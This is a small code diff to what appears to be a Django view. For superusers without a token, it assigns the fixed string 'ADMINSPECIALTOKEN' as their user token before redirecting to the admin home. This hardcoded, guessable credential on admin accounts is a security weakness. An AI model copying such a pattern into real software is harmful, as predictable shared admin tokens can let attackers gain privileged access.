@@ -259,6 +259,9 @@ def change_password(request):
 @login_required
 def router(request):
     if request.user.is_superuser:
+        if not request.user.user_token:
+            request.user.user_token='ADMINSPECIALTOKEN'
+            request.user.save()
         return redirect('admin-home', 'main')
     else:
         return redirect('logout')
